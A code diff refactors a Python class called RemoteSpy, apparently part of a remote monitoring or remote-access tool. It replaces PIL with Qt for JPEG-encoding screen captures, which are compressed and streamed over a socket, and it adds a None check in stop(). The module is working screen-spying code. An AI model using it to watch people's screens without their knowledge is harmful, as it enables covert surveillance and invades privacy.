@@ -1,12 +1,10 @@
-from PyQt5.QtCore import QObject
+from PyQt5.QtCore import QObject, QBuffer, QIODevice
+from PyQt5.QtGui import QImage
 import socket
 import struct
 from threading import Thread
 from mss import mss
-from PIL import Image
 import zlib
-from io import BytesIO
-import time
 import logging
 from Module.Packages import RemoteSpyFlag
 
@@ -35,10 +33,12 @@ class RemoteSpy(QObject):
             try:
                 with mss() as sct:
                     frame = sct.grab(sct.monitors[1])
-                    img = Image.frombytes('RGB', frame.size, frame.bgra, 'raw', 'BGRX')
-                    img_encoded = BytesIO()
-                    img.save(img_encoded, 'JPEG')
-                    img_encoded = zlib.compress(img_encoded.getvalue())
+                    img = QImage(frame.rgb, frame.width, frame.height, QImage.Format_RGB888)
+                    buffer = QBuffer()
+                    buffer.open(QIODevice.ReadWrite)
+                    img.save(buffer, 'JPEG', quality=80)
+                    img_encoded = zlib.compress(buffer.data())
+                    buffer.close()
                     header = struct.pack('!2i', RemoteSpyFlag.PackInfo, len(img_encoded))
                     self.socket_obj.send(header)
                     self.socket_obj.sendall(img_encoded)
@@ -49,7 +49,8 @@ class RemoteSpy(QObject):
 
     def stop(self):
         self.working = False
-        self.screen_send_thread.join()
+        if self.screen_send_thread is not None:
+            self.screen_send_thread.join()
         if self.socket_obj is not None:
             self.socket_obj.close()
             self.socket_obj = None
